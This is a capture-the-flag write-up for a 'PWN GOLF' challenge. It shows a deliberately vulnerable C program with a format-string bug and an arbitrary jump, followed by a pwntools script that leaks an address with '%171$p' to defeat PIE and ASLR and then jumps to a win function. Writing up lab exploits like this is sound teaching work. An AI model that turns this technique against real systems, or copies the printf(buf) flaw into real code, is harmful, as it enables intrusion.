## Let's get cracking...

### Challenge Description:

`Let’s go mini golfing! To win, just aim correctly! Except the hole with the pin keeps moving…`

Following is the main challenge file.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define MAX_STRINGS 32

void win() {
    system("cat /flag.txt");
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
            
    fflush(stdout);
    fflush(stdin);

    uintptr_t address;
    char *all_strings[MAX_STRINGS] = {NULL};
 char buf[1024] = {'\0'};

    printf("Welcome to PWN GOLF.\n");
    printf("Would you like to enter your name? ");
   
    fgets(buf, 1024, stdin);
    printf("hello: ");
 printf(buf);
   
    printf("\nAlright! Tell me the address you want to aim at!: ");
    scanf("%lx", &address);
    void (*target)(void) = (void(*))address;
    printf("Ok jumping to that address...");
    target();

    return 0;
}
```

## Challenge Breakdown:

It was a classic PWN challenge where the goal was to exploit a vulnerable program that allowed you to jump to any address you provided. The twist, however, was that both Position Independent Executable (`PIE`) and Address Space Layout Randomization (`ASLR`) were enabled, making it impossible to use static addresses to hijack the control flow. This meant I had to come up with a creative way to bypass the randomized memory layout. Instead of relying on known addresses, I had to leak or brute force information about the memory space to find where the key functions or gadgets were located.

### Solution:

```python
from pwn import *
from pwn import p64

binary = ELF("./golf")
#conn = process(binary.path)
conn = remote("localhost", 9999)

exploit = "%171$p"
conn.sendline(exploit)
leaked_address = conn.recvuntil(b"\n\n").split()
leaked_address = leaked_address[-1].decode('UTF-8')

leaked_addr_int = int(leaked_address, 16)

win_addr = leaked_addr_int - 26
win_addr = hex(win_addr)

conn.sendline(win_addr)
conn.interactive()
```

This exploit script solves the challenge by leveraging a format string vulnerability to leak the memory address of the `main` function. Since both `PIE` and `ASLR` are enabled, the program's memory layout is randomized, so static addresses cannot be used. The format string payload `%171$p` retrieves the address of the `main` function from the program's stack. Once the address is leaked and parsed, the script calculates the address of the `win` function by subtracting 26 (determined through prior reverse engineering). This offset allows the script to adjust for the randomized memory layout, effectively bypassing `ASLR` and `PIE` protections. The calculated `win` address is then sent, causing the program to jump to and execute the `win` function, thereby achieving code execution and solving the challenge.
